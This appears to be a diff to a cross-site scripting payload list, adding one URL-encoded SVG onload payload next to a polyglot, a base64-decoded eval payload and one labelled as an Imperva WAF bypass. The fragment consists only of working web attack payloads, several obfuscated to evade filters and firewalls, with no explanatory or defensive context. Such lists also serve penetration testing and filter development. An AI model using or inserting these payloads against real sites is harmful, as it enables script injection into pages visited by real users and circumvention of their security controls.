@@ -493,6 +493,7 @@ javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembe
 
 <form><button formaction=javascript:top['ev'+'al'](self['\x61\x74\x6f\x62'](`YWxlcnQoMSk7`));//
 
+https%3A%2F%google.com%3CSvg%2Fonload%3Dalert(1)%3E
 
 Imperva WAF Bypass for XSS;
 <details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];">
